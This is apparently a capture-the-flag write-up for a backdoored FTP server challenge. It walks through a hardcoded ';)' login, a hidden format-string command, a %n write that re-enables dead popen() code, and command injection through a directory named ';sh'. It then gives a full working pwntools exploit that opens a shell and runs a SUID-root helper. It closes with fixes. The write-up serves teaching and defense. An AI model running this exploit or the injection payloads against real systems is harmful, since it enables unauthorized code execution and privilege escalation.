Pivotman is an Easy **Pwn** challenge: a custom FTP server with an inserted backdoor. The interesting part is that the binary is hardened so no buffer overflow ever reaches a return address — the intended path is a single format-string write that *re-enables a dead code path*, which then leads to [OS command injection](https://cwe.mitre.org/data/definitions/78.html) and a SUID-root flag read.

## Overview

The server is a custom FTP daemon — `checksec` shows **Full RELRO**, NX, PIE, and **no stack canary**, linked against glibc 2.33. `socat` forks one process per connection, running as the unprivileged `ctf` user. The path: backdoor login → a hidden `BKDR` verb that is an [uncontrolled format string](https://cwe.mitre.org/data/definitions/134.html) → flip a single gating variable to wake up a dead `popen()` → command injection through the working directory → run a SUID-root helper to read the flag.

## The technique

Every read/copy buffer in the binary is deliberately placed mid-frame, so each one stops about `0x10` bytes **short** of the saved return address. Direct RIP overwrite is impossible — so the bug has to be used surgically.

- **Backdoor login.** `USER` / `PASS` route to a function that is just `strcmp(arg, ";)") == 0`, which bypasses the real `getspnam()` shadow lookup. `USER ;)` then `PASS ;)` logs in.
- **Hidden `BKDR` verb = format string.** The command-name dispatch table is runtime-relocated (`.rela.dyn`, `R_X86_64_RELATIVE`), and resolving it reveals a 30th entry: `BKDR`. Its handler builds `"%d BKDR " + your_input + " \r\n"` and passes the *whole buffer as the format* to `vsnprintf` — an [externally-controlled format string](https://cwe.mitre.org/data/definitions/134.html). That gives arbitrary read (`%N$p`) and arbitrary write (`%N$n`). The input is qword-aligned at format-argument slot **1031**.
- **Flip one gate variable.** The `LIST` verb runs `popen("ls -l <getcwd>")` but is dead code, gated by a **signed** integer `gate` at `rbp-0x10` (initialised to `-1`, never set non-negative by any legitimate path). Leak `main`'s saved `rbp` with `%2736$p`; the gate lives at `main_rbp - 0x20`. A single `%n` write sets it to the current output count (`12`), making it non-negative and re-enabling `popen()`. No libc leak, no ROP.
- **Command injection through the cwd.** `getcwd()` is interpolated straight into the shell string. Create a directory named with a shell metacharacter and `chdir` into it (`MKD ;sh`, `CWD ;sh`), so `popen` runs `/bin/sh -c "ls -l /home/ctf/;sh"` — the `;sh` spawns an interactive shell whose stdin is the inherited socket.
- **SUID escalation.** `/home/ctf/get_flag` is SUID root, but has a *relative* ELF interpreter, so it must run from its own directory: `cd /home/ctf && ./get_flag`.

## Solution

The working exploit (`solve.py`). The CRLF strip on the server nulls any `0x0a`/`0x0d` byte in the input, so a `%n` target address containing those bytes is corrupted — the script just reconnects for a fresh stack-ASLR roll until the address is clean.

```python
#!/usr/bin/env python3
# Pivotman — backdoor FTP -> format string -> gate flip -> popen cmd-injection -> SUID flag
import sys, re
from pwn import *
context.clear(arch='amd64', log_level='warn')
HOST, PORT = sys.argv[1], int(sys.argv[2])

def cmd(io, line, recv=True):
    io.send(line + b'\r\n')
    return io.recv(timeout=2) if recv else b''

def attempt():
    io = remote(HOST, PORT)
    io.recv(timeout=2)                         # banner
    cmd(io, b'USER ;)'); cmd(io, b'PASS ;)')   # hardcoded backdoor credential ";)"

    # leak main's saved rbp via the BKDR format-string bug; derive the LIST gate addr
    r = cmd(io, b'BKDR %2736$p')
    main_rbp = int(r.split(b'BKDR ', 1)[1].split()[0], 16)
    gate = main_rbp - 0x20                      # signed gate at dispatcher rbp-0x10

    # the CRLF strip nulls 0x0a/0x0d in input -> bad %n target -> reroll ASLR
    if b'\n' in p64(gate) or b'\r' in p64(gate):
        io.close(); return False

    # one %n write: gate := output-count (12) >= 0  -> re-enables the dead popen()
    fmt = b'%1032$n'                            # slot 1032 = the address we append
    cmd(io, b'BKDR ' + fmt + b' ' * (8 - len(fmt)) + p64(gate))

    # make getcwd() a shell payload, then trigger LIST -> popen("ls -l /home/ctf/;sh")
    cmd(io, b'MKD ;sh'); cmd(io, b'CWD ;sh')
    io.send(b'LIST\r\n'); sleep(0.8)

    # the injected ';sh' reads these from our socket; ./get_flag is SUID root
    # (relative ld interpreter -> must cd into its dir). `exit` flushes the popen pipe.
    io.send(b'cd /home/ctf && ./get_flag 2>&1; echo ___END; exit\n')
    buf = b''
    for _ in range(12):
        try: c = io.recv(timeout=2)
        except EOFError: break
        if not c: break
        buf += c
        if b'___END' in buf: break
    m = re.search(rb'HTB\{[^}]+\}', buf)
    if m:
        print('FLAG:', m.group().decode()); return True
    io.close(); return False

for _ in range(20):                            # loop until a clean (bad-byte-free) ASLR roll
    if attempt(): break
```

Running it against the instance recovers the flag:

```text
$ python3 solve.py <host> <port>
FLAG: HTB{...}
```

## Why it worked

The author hardened the binary against the usual overflow-to-RIP path, but left a *decision variable* — a signed gate guarding a dangerous `popen()` — that a one-shot format-string `%n` could flip. Combined with `getcwd()` being concatenated into a shell command, re-enabling that one code path was enough for full RCE. The format string itself (`vsnprintf` on attacker-controlled input) is the root cause; the command injection and the SUID helper are just the steps after.

## Fix / defense

- Remove the `BKDR` backdoor and the hardcoded `;)` credential.
- Never pass user data as a format string: `vsnprintf(out, n, "%s", user)`.
- Don't build shell strings from `getcwd()` — use `execvp("ls", argv)` instead of `popen`.
- Drop the SUID bit / read sensitive files with least privilege, and use an absolute ELF interpreter.
